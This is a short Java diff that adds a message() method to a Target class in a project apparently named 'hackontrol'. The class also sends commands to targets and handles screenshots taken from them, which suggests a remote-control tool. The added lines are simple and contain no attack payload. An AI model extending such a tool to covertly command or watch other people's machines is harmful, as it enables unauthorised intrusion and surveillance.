@@ -53,6 +53,11 @@ public class Target {
 		this.hackontrol.request.command(this.identifier, command);
 	}
 
+	public void message(String message) {
+		this.check();
+		this.hackontrol.request.message(this.identifier, message);
+	}
+
 	void screenshotTaken(Attachment attachment) {
 		new Thread(() -> {
 			byte[] image;
